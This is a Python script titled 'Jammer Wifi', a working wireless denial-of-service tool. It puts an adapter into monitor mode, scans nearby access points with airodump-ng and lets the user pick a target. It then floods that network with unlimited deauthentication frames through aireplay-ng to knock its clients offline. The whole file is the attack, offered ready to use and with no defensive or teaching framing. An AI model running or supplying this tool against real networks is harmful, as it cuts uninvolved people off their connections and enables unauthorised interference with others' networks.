from os import environ, listdir, getcwd, mkdir
from subprocess import run, Popen, call, DEVNULL
from csv import DictReader
from time import sleep
from datetime import datetime
from shutil import move


call('clear', shell=True)

print("""
     ____.                                      __      __.__  _____.__ 
    |    |____    _____   _____   ___________  /  \    /  \__|/ ____\__|
    |    \__  \  /     \ /     \_/ __ \_  __ \ \   \/\/   /  \   __\|  |
/\__|    |/ __ \|  Y Y  \  Y Y  \  ___/|  | \/  \        /|  ||  |  |  |
\________(____  /__|_|  /__|_|  /\___  >__|      \__/\  / |__||__|  |__|
              \/      \/      \/     \/               \/             
""")



def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item['ESSID']:
            check_status = False

    return check_status

if not 'SUDO_UID' in environ.keys():
    print('Try running this program with sudo')
    exit()

for file_name in listdir():

    if '.csv' in file_name:
        directory = getcwd()
        try:
            mkdir(directory + '/backup/')
        except:
            pass
        timestamp = datetime.now()
        move(file_name, directory + '/backup/' + str(timestamp) + '-' + file_name)

check_wifi_result = listdir('/sys/class/net/')

if len(check_wifi_result) == 0:
    print('Please connect a WiFi adapter and try again')
    exit()


print('The following WiFi interfaces are available:')
for index, item in enumerate(check_wifi_result):
    print(f'{index} - {item}')

while True:
    interface_choice = input('Please select the interface you want to use for the attack: ')
    try:
        if check_wifi_result[int(interface_choice)]:
            break
    except:
        print('Please enter a number that corresponds with the choices available !')
    

interface_choice = check_wifi_result[int(interface_choice)]

kill_confilict_processes =  run(['sudo', 'airmon-ng', 'check', 'kill'])
call('clear', shell=True)

print('The following model for the enable monitor mode :')
models_ = ['airmon-ng', 'iwconfig (suggest)']
for index, item in enumerate(models_):
    print(f'{index} - {item}')

while True:
    model_choice = input('Please select the model you want to use for the enable monitor mode: ')
    try:
        if models_[int(model_choice)]:
            if int(model_choice) == 0:
                print('Putting Wifi adapter into monitored mode:')
                print('Plese choice 1  ):')
                #put_in_monitored_mode_airmon = run(['sudo', 'airmon-ng', 'start', interface_choice])
                continue
            elif int(model_choice) == 1:
                print('Putting Wifi adapter into monitored mode:')
                interface_model_iwconfig_down = run(['sudo', 'ifconfig', interface_choice , 'down'])
                interface_model_iwconfig = run(['sudo', 'iwconfig', 'mode', 'monitor', interface_choice])
                interface_model_iwconfig_up= run(['sudo', 'ifconfig', interface_choice , 'up'])
                break
    except:
        print('Please enter a number that corresponds with the choices available !')


discover_access_points = Popen(['sudo', 'airodump-ng','-w' ,'file','--write-interval', '1','--output-format', 'csv', interface_choice], stdout=DEVNULL, stderr=DEVNULL)

active_wireless_networks = []

try:
    while True:
        call('clear', shell=True)
        for file_name in listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if '.csv' in file_name:
                    with open(file_name) as csv_file:
                        csv_file.seek(0)
                        csv_reader = DictReader(csv_file, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row['BSSID'] == 'BSSID':
                                pass
                            elif row['BSSID'] == 'Station MAC':
                                break
                            elif check_for_essid(row['ESSID'], active_wireless_networks):
                                active_wireless_networks.append(row)

        print('Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n')
        print('No |\tBSSID              |\tChannel|\tESSID                         |')
        print('___|\t___________________|\t_______|\t______________________________|')
        for index, item in enumerate(active_wireless_networks):

            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        sleep(1)

except KeyboardInterrupt:
    print('\nReady to make choice.')

while True:
    choice = input('Please select a choice from above: ')
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print('Please try again.')

bssid_choice_target = str(active_wireless_networks[int(choice)]['BSSID'])
channel_choice_target = active_wireless_networks[int(choice)]['channel'].strip()

try:
    run(['aireplay-ng', '--deauth', '0', '-a', bssid_choice_target, interface_choice])

except KeyboardInterrupt:
    interface_model_iwconfig_down = run(['sudo', 'ifconfig', interface_choice , 'down'])
    interface_model_iwconfig = run(['sudo', 'iwconfig', 'mode', 'managed', interface_choice])
    interface_model_iwconfig_up= run(['sudo', 'ifconfig', interface_choice , 'up'])
    print('ُThe attack was interrupt by the user . Bye !')            
